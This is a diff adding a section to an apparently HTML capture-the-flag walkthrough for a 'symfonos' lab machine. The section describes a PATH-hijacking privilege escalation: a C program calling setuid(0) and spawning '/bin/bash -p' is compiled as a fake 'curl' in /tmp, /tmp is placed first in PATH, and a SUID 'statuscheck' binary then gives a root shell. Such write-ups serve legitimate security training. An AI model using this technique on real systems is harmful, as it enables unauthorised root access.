@@ -500,6 +500,25 @@ deregister_tm_clones
 ...
     </pre>
 
+    <p>In order to exploit this we will create a malicious curl executable and then add  the location of this malicious curl to our PATH before the location of the legitimate curl command.</p>
+
+    <li>Navigate to /tmp and compile this:</li>
+
+    <pre>
+int main() {
+    setuid(0);
+    system(&quot;/bin/bash -p&quot;);
+}
+#gcc -o &lt;curl&gt; &lt;curl.c&gt;
+    </pre>
+
+    <li>Now that we have compile our malicious curl into the /tmp directory we will add this to the beginning of our path variable.</li>
+
+    <pre>
+helios@symfonos:/tmp$ export PATH=/tmp:$PATH
+    </pre>
+
+    <li>With our malicious curl in the beginning of our PATH it will execute before the legitimate one.  So now we go back to /opt and execute statuscheck.  We have root now.</li>
 
 </body>
 </html>
